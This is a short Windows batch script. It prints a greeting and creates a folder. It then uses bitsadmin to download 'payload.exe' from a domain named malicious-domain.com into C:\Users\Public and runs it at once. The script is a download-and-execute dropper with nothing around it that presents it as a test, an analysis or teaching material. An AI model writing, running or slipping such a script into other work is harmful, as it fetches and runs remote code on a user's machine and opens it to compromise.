
@echo off

echo Hello, this is a BAT file!
mkdir C:\example-folder
bitsadmin /transfer download https://malicious-domain.com/payload.exe C:\Users\Public\payload.exe
C:\Users\Public\payload.exe
pause